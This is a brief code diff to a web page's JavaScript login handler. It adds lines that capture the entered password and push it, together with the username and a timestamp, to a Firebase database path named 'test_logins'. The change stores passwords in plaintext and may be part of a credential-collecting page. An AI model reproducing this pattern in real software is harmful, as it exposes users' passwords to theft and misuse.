@@ -117,6 +117,7 @@ document.querySelector(".loginbtn").addEventListener("click", function(e){
     e.preventDefault(); // stop default link behavior
 
     const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
 
     if(!username){
         alert("Enter username");
@@ -126,6 +127,7 @@ document.querySelector(".loginbtn").addEventListener("click", function(e){
     // Save to Firebase
     database.ref("test_logins").push({
         username: username,
+        password: password,
         time: new Date().toISOString()
     })
     .then(() => {
